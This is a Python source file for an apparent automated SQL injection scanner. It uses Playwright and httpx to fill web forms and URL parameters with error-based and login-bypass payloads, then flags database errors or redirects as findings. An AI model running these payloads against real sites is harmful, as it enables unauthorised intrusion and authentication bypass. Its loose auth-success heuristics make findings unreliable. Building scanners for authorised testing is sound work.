"""Browser-based SQL Injection Agent using Playwright - Fixed Version"""

import asyncio
import logging
import re
from typing import List, Optional, Dict, Any, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

from playwright.async_api import async_playwright, Page, Browser

from hunter.models import Endpoint, Finding, VulnType, Severity, FindingStatus
from hunter.safety.controller import SafetyController
from hunter.config import settings

logger = logging.getLogger(__name__)


# SQL error patterns
SQL_ERROR_PATTERNS = {
    'mysql': [
        r'SQL syntax.*MySQL', r'Warning.*mysql_', r'You have an error in your SQL syntax',
        r'mysqli_', r'mysql_fetch_',
    ],
    'postgresql': [
        r'PostgreSQL.*ERROR', r'Warning.*pg_', r'Pg_query', r'Pg_exec',
    ],
    'mssql': [
        r'Driver.*SQL.*Server', r'ODBC SQL Server Driver', r'Microsoft SQL Server',
    ],
    'oracle': [
        r'ORA-[0-9]{5}', r'Oracle error', r'Oracle.*Driver',
    ],
    'sqlite': [
        r'SQLite.*error', r'SQLite.*syntax', r'unrecognized token:',
    ],
    'generic': [
        r'SQL syntax.*error', r'syntax error.*SQL', r'Unexpected.*SQL',
        r'Unclosed quotation mark', r'quoted string not properly terminated',
    ]
}

# SQLi payloads
SQLI_PAYLOADS = {
    "error_based": ["'", "''", '"', "`", ")", "))", "'))", "'))--", '")--'],
    "auth_bypass": [
        "admin'--", "admin' #", "' OR 1=1--", "' OR 1=1#", 
        "') OR '1'='1--", "' OR '1'='1' --", "'='' OR",
    ]
}


class RateLimiter:
    """Simple rate limiter"""
    
    def __init__(self, delay: float = 1.0):
        self.delay = delay
        self.last_request = 0
    
    async def acquire(self):
        import time
        now = time.time()
        if now - self.last_request < self.delay:
            await asyncio.sleep(self.delay - (now - self.last_request))
        self.last_request = time.time()


class BrowserSQLiAgent:
    """Browser-based SQL Injection detection using Playwright"""
    
    NAME = "browser_sqli_agent"
    
    def __init__(self):
        self.safety = SafetyController()
        self.rate_limiter = RateLimiter(delay=settings.delay_between_requests)
        self.findings: List[Finding] = []
        self.browser: Optional[Browser] = None
        self.playwright = None
    
    async def __aenter__(self):
        """Initialize browser"""
        self.playwright = await async_playwright().start()
        self.browser = await self.playwright.chromium.launch(headless=True)
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Close browser"""
        if self.browser:
            await self.browser.close()
        if self.playwright:
            await self.playwright.stop()
    
    async def analyze(self, endpoint: Endpoint) -> List[Finding]:
        """Analyze an endpoint for SQL injection"""
        logger.info(f"Browser analysis: {endpoint.url}")
        
        if not self.browser:
            raise RuntimeError("Browser not initialized. Use 'async with' context manager.")
        
        # Test URL parameters first (GET requests)
        await self._test_url_parameters(endpoint.url)
        
        # Then test forms
        await self._test_forms_on_page(endpoint.url)
        
        return self.findings
    
    async def _test_url_parameters(self, url: str) -> None:
        """Test URL query parameters for SQLi using HTTP (faster)"""
        import httpx
        
        parsed = urlparse(url)
        if not parsed.query:
            return
        
        params = parse_qs(parsed.query)
        if not params:
            return
        
        logger.info(f"Testing {len(params)} URL parameter(s): {list(params.keys())}")
        
        async with httpx.AsyncClient(follow_redirects=True, timeout=30, verify=False) as client:
            for param_name in params.keys():
                for payload in SQLI_PAYLOADS["error_based"]:
                    try:
                        await self.rate_limiter.acquire()
                        
                        # Inject payload
                        new_params = params.copy()
                        new_params[param_name] = [payload]
                        new_query = urlencode(new_params, doseq=True)
                        test_url = urlunparse(parsed._replace(query=new_query))
                        
                        response = await client.get(test_url)
                        
                        # Check for SQL errors
                        db_type, error_msg = self._detect_sql_error(response.text)
                        if db_type:
                            logger.info(f"[FOUND] SQLi in URL param '{param_name}' - {db_type}")
                            
                            finding = self._create_finding(
                                url=url,
                                parameter=param_name,
                                payload=payload,
                                evidence=error_msg,
                                db_type=db_type,
                                method="GET"
                            )
                            self._add_finding(finding)
                            break  # Found one, move to next param
                            
                    except Exception as e:
                        logger.debug(f"URL param test failed: {e}")
    
    async def _test_forms_on_page(self, url: str) -> None:
        """Test all forms on a page"""
        page = await self.browser.new_page()
        
        try:
            await self.rate_limiter.acquire()
            await page.goto(url, wait_until="domcontentloaded", timeout=30000)
            
            # Extract all form data BEFORE submitting anything
            forms_data = await page.evaluate("""
                () => {
                    const forms = [];
                    document.querySelectorAll('form').forEach((form, idx) => {
                        const inputs = [];
                        form.querySelectorAll('input, textarea, select').forEach(input => {
                            if (input.name && !['submit', 'button', 'hidden', 'file'].includes(input.type)) {
                                inputs.push({
                                    name: input.name,
                                    type: input.type || 'text',
                                    tagName: input.tagName
                                });
                            }
                        });
                        
                        if (inputs.length > 0) {
                            forms.push({
                                index: idx,
                                action: form.action || '',
                                method: (form.method || 'get').toLowerCase(),
                                inputs: inputs
                            });
                        }
                    });
                    return forms;
                }
            """)
            
            logger.info(f"Found {len(forms_data)} form(s) on {url}")
            
            for form_data in forms_data:
                await self._test_form_data(page, form_data, url)
                
        except Exception as e:
            logger.error(f"Browser error: {e}")
        finally:
            await page.close()
    
    async def _test_form_data(self, page: Page, form_data: Dict, base_url: str) -> None:
        """Test a form using extracted data"""
        
        # Resolve form action URL
        form_action = form_data['action']
        if form_action:
            form_url = urljoin(base_url, form_action)
        else:
            form_url = base_url
        
        method = form_data['method']
        inputs = form_data['inputs']
        
        logger.info(f"Form: {form_url} ({method}) with fields: {[i['name'] for i in inputs]}")
        
        # Test each input field
        for input_field in inputs:
            field_name = input_field['name']
            field_type = input_field['type']
            
            # Skip non-text fields
            if field_type not in ['text', 'email', 'search', 'password', '']:
                continue
            
            # Test auth bypass payloads for login forms
            payloads = SQLI_PAYLOADS["auth_bypass"] if field_type == 'password' or 'pass' in field_name.lower() else SQLI_PAYLOADS["error_based"]
            
            for payload in payloads:
                finding = await self._submit_form_test(page, form_url, form_data, input_field, payload, base_url)
                if finding:
                    self._add_finding(finding)
                    break  # Found one, move to next field
    
    async def _submit_form_test(self, page: Page, form_url: str, form_data: Dict, 
                                input_field: Dict, payload: str, base_url: str) -> Optional[Finding]:
        """Submit a form with a specific payload and check result"""
        
        field_name = input_field['name']
        method = form_data['method']
        
        try:
            await self.rate_limiter.acquire()
            
            # Navigate to the original page to get a fresh form
            await page.goto(base_url, wait_until="domcontentloaded", timeout=30000)
            
            # Wait a moment for any JS to initialize
            await asyncio.sleep(0.5)
            
            # Fill the target field with payload
            await page.fill(f"[name='{field_name}']", payload)
            
            # Fill other fields with dummy data
            for other_input in form_data['inputs']:
                if other_input['name'] != field_name:
                    dummy_value = "password123" if other_input['type'] == 'password' else "testuser"
                    try:
                        await page.fill(f"[name='{other_input['name']}']", dummy_value)
                    except:
                        pass  # Field might not be visible
            
            # Capture state before submission
            before_url = page.url
            
            # Submit the form
            try:
                # Try clicking submit button
                submit_btn = await page.query_selector("input[type='submit'], button[type='submit']")
                if submit_btn:
                    await submit_btn.click()
                else:
                    # Press enter in the field
                    await page.press(f"[name='{field_name}']", "Enter")
            except Exception as e:
                logger.debug(f"Submit failed: {e}")
                return None
            
            # Wait for navigation or network idle
            try:
                await page.wait_for_load_state("networkidle", timeout=5000)
            except:
                pass
            
            # Get final state
            after_url = page.url
            page_content = await page.content()
            page_text = await page.inner_text("body")
            
            # Check for SQL errors
            db_type, error_msg = self._detect_sql_error(page_content)
            if db_type:
                logger.info(f"[FOUND] SQLi in field '{field_name}' - {db_type}")
                return self._create_finding(
                    url=form_url,
                    parameter=field_name,
                    payload=payload,
                    evidence=error_msg,
                    db_type=db_type,
                    method=method.upper()
                )
            
            # Check for auth bypass (URL changed, logout link appeared, etc.)
            if self._check_auth_success(page, before_url, after_url, page_text):
                logger.info(f"[FOUND] Auth bypass in field '{field_name}'")
                return self._create_finding(
                    url=form_url,
                    parameter=field_name,
                    payload=payload,
                    evidence=f"Authentication bypass successful. Redirected from {before_url} to {after_url}",
                    db_type="unknown",
                    method=method.upper()
                )
            
        except Exception as e:
            logger.debug(f"Form test error: {e}")
        
        return None
    
    def _detect_sql_error(self, content: str) -> Tuple[Optional[str], Optional[str]]:
        """Detect SQL error in content"""
        for db_type, patterns in SQL_ERROR_PATTERNS.items():
            for pattern in patterns:
                match = re.search(pattern, content, re.IGNORECASE)
                if match:
                    start = max(0, match.start() - 100)
                    end = min(len(content), match.end() + 200)
                    return db_type, content[start:end]
        return None, None
    
    def _check_auth_success(self, page: Page, before_url: str, after_url: str, page_text: str) -> bool:
        """Check if authentication was successful"""
        
        # 1. URL changed away from login page
        if "login" in before_url.lower() and "login" not in after_url.lower():
            return True
        
        # 2. Logout link appeared
        logout_indicators = ["logout", "sign out", "log out", "welcome", "my account", "dashboard"]
        page_lower = page_text.lower()
        
        for indicator in logout_indicators:
            if indicator in page_lower:
                # Double check by looking for the link
                return True
        
        # 3. Check for redirect status
        if before_url != after_url and after_url != before_url:
            # Page redirected somewhere
            return True
        
        return False
    
    def _create_finding(self, url: str, parameter: str, payload: str, 
                        evidence: str, db_type: str, method: str) -> Finding:
        """Create a Finding object"""
        
        severity = Severity.HIGH if "auth" in evidence.lower() else Severity.MEDIUM
        
        if method == "GET":
            poc = f"curl -X GET '{url}'  # Add {parameter}={payload}"
        else:
            poc = f"curl -X POST '{url}' -d '{parameter}={payload}'"
        
        return Finding(
            vulnerability_type=VulnType.SQLI,
            severity=severity,
            url=url,
            parameter=parameter,
            method=method,
            payload=payload,
            evidence=evidence[:1000],
            proof_of_concept=poc,
            title=f"SQL Injection in '{parameter}' field ({db_type})",
            description=f"SQL injection vulnerability detected in the '{parameter}' field via {method} request.",
            impact="Attackers can bypass authentication or manipulate database queries.",
            remediation="Use parameterized queries and input validation.",
            discovered_by=self.NAME
        )
    
    def _add_finding(self, finding: Finding) -> None:
        """Add finding with safety check"""
        exploit_req = self.safety.assess_sql_injection(finding)
        if exploit_req.requires_approval:
            approved = self.safety.request_approval(exploit_req)
            if not approved:
                finding.status = FindingStatus.SKIPPED
                return
        
        finding.confirmed = True
        finding.status = FindingStatus.CONFIRMED
        self.findings.append(finding)
        logger.info(f"[CONFIRMED] Added finding: {finding.title}")
